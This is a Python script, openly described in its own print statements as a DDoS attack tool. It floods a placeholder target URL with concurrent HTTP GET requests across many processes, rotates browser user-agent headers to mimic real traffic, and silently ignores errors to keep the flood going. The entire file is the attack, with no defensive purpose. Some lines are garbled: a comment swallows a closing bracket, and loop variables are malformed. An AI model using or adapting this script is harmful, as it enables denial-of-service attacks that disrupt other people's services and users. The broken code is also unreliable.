import aiohttp
import asyncio
import multiprocessing
import random
import time
from itertools import cycle
from faker import Faker
import uvloop

# Set event loop policy for better performance
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

# Configuration
TARGET_URL ="http://target-server.com"  # Replace with the target server URL
REQUESTS_PER_PROCESS = 100000  # Number of requests per process
NUM_PROCESSES = multiprocessing.cpu_count() * 2  # Double the CPU cores for max efficiency
USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15","Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    # Add more if needed]fake = Faker()
USER_AGENT_CYCLE = cycle(USER_AGENTS)

async def make_request(session, url, headers):
    try:
        async with session.get(url, headers=headers, timeout=5) as response:
            await response.read()  # Read response to simulate real traffic
    except Exception:
        pass  # Ignore errors to keep the flood going

async def worker(url, num_requests):
    headers = {"User-Agent": next(USER_AGENT_CYCLE),"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language":"en-US,en;q=0.5","Connection":"keep-alive",}    async with aiohttp.ClientSession() as session:
        tasks = []
        for_ in range(num_requests):
            tasks.append(make_request(session, url, headers))
        await asyncio.gather(*tasks, return_exceptions=True)

def run_worker(url, num_requests):
    asyncio.run(worker(url, num_requests))

def main():
    print(f"Starting DDoS attack on {TARGET_URL} with {NUM_PROCESSES} processes...")
    start_time = time.time()
    
    # Create a pool of processes
    processes = []
    for_ in range(NUM_PROCESSES):
        p = multiprocessing.Process(target=run_worker, args=(TARGET_URL, REQUESTS_PER_PROCESS // NUM_PROCESSES))
        processes.append(p)
        p.start()
    
    # Wait for all processes to complete
    for p in processes:
        p.join()
    
    elapsed = time.time() - start_time
    total_requests = REQUESTS_PER_PROCESS
    print(f"Attack completed. Sent {total_requests} requests in {elapsed:.2f} seconds.")
    print(f"Requests per second: {total_requests / elapsed:.2f}")

if __name__ == "__main__":
    main()
